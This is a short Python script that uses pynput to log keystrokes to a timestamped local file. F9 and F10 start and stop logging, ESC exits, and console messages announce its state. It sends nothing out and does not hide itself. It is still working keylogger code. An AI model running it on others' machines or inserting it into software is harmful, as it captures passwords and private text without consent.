from pynput import keyboard
import logging
from datetime import datetime

# Set up log file with timestamp
log_file = f"keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Status flag to control logging
is_logging = False

def format_key(key):
    """Format the key for readability in the log."""
    try:
        return key.char
    except AttributeError:
        if key == keyboard.Key.space:
            return ' [SPACE] '
        elif key == keyboard.Key.enter:
            return '\n[ENTER]\n'
        elif key == keyboard.Key.tab:
            return '[TAB]'
        elif key == keyboard.Key.backspace:
            return '[BACKSPACE]'
        else:
            return f' [{key.name.upper()}] '

def on_press(key):
    global is_logging

    # Start logging on F9
    if key == keyboard.Key.f9:
        if not is_logging:
            is_logging = True
            print("🔴 Keylogger started (F9 to start, F10 to stop)")
            logging.info("=== Keylogger Started ===")
        return

    # Stop logging on F10
    if key == keyboard.Key.f10:
        if is_logging:
            is_logging = False
            print("🛑 Keylogger stopped (F9 to start again)")
            logging.info("=== Keylogger Stopped ===")
        return

    # Log only when active
    if is_logging:
        logging.info(format_key(key))

def on_release(key):
    # Optional: Exit completely on Esc key
    if key == keyboard.Key.esc:
        print("✅ Keylogger exited with [ESC]")
        return False

# Start listening
print("👀 Keylogger is running... (Press F9 to start, F10 to stop, ESC to quit)")
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
